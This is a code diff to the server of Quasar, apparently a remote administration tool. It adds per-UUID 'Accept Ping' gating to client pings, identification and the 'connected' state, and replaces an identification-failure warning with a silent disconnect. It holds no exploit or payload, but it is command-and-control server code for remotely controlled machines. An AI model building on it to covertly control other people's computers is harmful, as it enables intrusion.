@@ -11,6 +11,8 @@ namespace Quasar.Server.Networking
 {
     public class QuasarServer : Server
     {
+        private readonly Utilities.ClientDatabase _clientDb = new Utilities.ClientDatabase();
+
         /// <summary>
         /// Gets the clients currently connected and identified to the server.
         /// </summary>
@@ -71,6 +73,7 @@ namespace Quasar.Server.Networking
         {
             base.ClientState += OnClientState;
             base.ClientRead += OnClientRead;
+            _clientDb.Initialize();
         }
 
         /// <summary>
@@ -100,17 +103,45 @@ namespace Quasar.Server.Networking
         {
             if (!client.Identified)
             {
+                if (message is ClientPingRequest ping)
+                {
+                    string uuid = ping.Uuid ?? "";
+                    if (string.IsNullOrWhiteSpace(uuid))
+                    {
+                        client.Send(new ClientIdentificationResult { Result = false });
+                        client.Disconnect();
+                        return;
+                    }
+
+                    // Make sure downstream processors (toast/DB) can associate this ping to the UUID.
+                    client.Value.Id = uuid;
+
+                    // Update UI/DB (toast + LastPing) and show notification even when checkbox is not enabled.
+                    MessageHandler.Process(client, message);
+
+                    bool accept = _clientDb.GetClientAcceptPing(uuid);
+                    client.Send(new ClientIdentificationResult { Result = accept }); // respond to ping handshake
+                    if (!accept)
+                        client.Disconnect();
+                    return;
+                }
+
                 if (message.GetType() == typeof (ClientIdentification))
                 {
                     client.Identified = IdentifyClient(client, (ClientIdentification) message);
                     if (client.Identified)
                     {
                         client.Send(new ClientIdentificationResult {Result = true}); // finish handshake
-                        OnClientConnected(client);
+                        /* Only show as connected in UI when Accept Ping is enabled.
+                         * If disabled, we still allow identification so we can receive periodic pings (and show toast),
+                         * but we won't consider the client "connected" for control actions. */
+                        if (_clientDb.GetClientAcceptPing(client.Value?.Id))
+                            OnClientConnected(client);
                     }
                     else
                     {
-                        MessageBox.Show("Client identification failed (e.g. invalid signature or Id).", "Viewer - Identification Failed", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                        /* Identification can fail for expected reasons (e.g. Accept Ping not enabled for that UUID).
+                         * Disconnect silently to avoid spamming the operator. */
                         client.Disconnect();
                     }
                 }
@@ -134,6 +165,10 @@ namespace Quasar.Server.Networking
 
             /* Support both legacy auto-generated 64-char IDs and user-provided GUID-style 36-char IDs. */
             if (packet.Id.Length != 64 && packet.Id.Length != 36)
+                return false;
+
+            /* Only identify if "Accept Ping" is enabled for this UUID. */
+            if (!_clientDb.GetClientAcceptPing(packet.Id))
                 return false;
 
             client.Value.Version = packet.Version;
